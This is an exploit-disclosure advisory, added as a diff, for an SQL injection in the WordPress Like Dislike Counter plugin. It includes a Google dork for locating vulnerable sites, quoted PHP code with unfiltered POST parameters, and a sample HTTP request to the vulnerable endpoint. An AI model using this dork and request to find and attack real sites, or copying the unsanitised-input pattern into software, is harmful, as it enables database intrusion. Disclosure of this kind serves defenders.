@@ -1,0 +1,82 @@
+#################################################################################################
+#
+# Title                : Wordpress Like Dislike Counter Plugin SQL 
+Injection Vulnerability
+# Risk                 : High+/Critical
+# Exploit Author       : XroGuE
+# Google Dork          : 
+inurl:plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php 
+  AND  plugins/pro-like-dislike-counter/ldc-ajax-counter.php
+# Plugin Version       : 1.2.3
+# Plugin Name          : Like Dislike Counter
+# Plugin Download Link : 
+http://downloads.wordpress.org/plugin/like-dislike-counter-for-posts-pages-and-comments.zip
+# Vendor Home          : www.wpfruits.com
+# Date                 : 2014/09/05
+# Tested in            : Win7 - Linux
+#
+##################################################################################################
+# This Vulnerability Available in Both Version of This Plugin (Free & 
+Pro Version).
+#
+# PoC :
+#
+# 
+http://localhost/wp/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php
+#
+# Vulnerable Page : ajax_counter.php
+#
+#	if (!$changedDir)$changedDir = 
+preg_replace('|wp-content.*$|','',__FILE__);
+#	include_once($changedDir.'/wp-config.php');
+#	if(isset($_COOKIE['ul_post_cnt']))
+#	{
+#	$posts_present=$_COOKIE['ul_post_cnt'];
+#	}
+#	else
+#	{
+#	$posts_present=array();
+#	}
+#   // Here ------------------------> Inputs Not Filtered ! :|
+#	$post_id=$_POST['post_id'];
+#	$up_type=$_POST['up_type'];
+#   // Here <------------------------
+#	if($up_type=='c_like'||$up_type=='c_dislike')
+#	{
+#	$for_com='c_';
+#	}
+#	else
+#	{
+#	$for_com='';
+#	}
+#	if(!in_array($for_com.$post_id,$posts_present))
+#	{
+#	update_post_ul_meta($post_id,$up_type);
+#	}
+#	echo get_post_ul_meta($post_id,$up_type);
+#
+##################################################################################################
+# POST 
+wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php 
+HTTP/1.1
+# Host: localhost
+# User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) 
+Gecko/20100101 Firefox/31.0 AlexaToolbar/alxf-2.21
+# Accept: */*
+# Accept-Language: en-US,en;q=0.5
+# Accept-Encoding: gzip, deflate
+# Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+# X-Requested-With: XMLHttpRequest
+# Referer: http://localhost/wp/
+# Content-Length: 24
+# Connection: keep-alive
+# Pragma: no-cache
+# Cache-Control: no-cache
+# post_id=1&up_type=like
+##################################################################################################
+#
+# Founded By : XroGuE
+# Website    : http://www.Att4ck3r.ir
+# E-Mail     : info[at]att4ck3r[Dot]ir
+#
+##################################################################################################
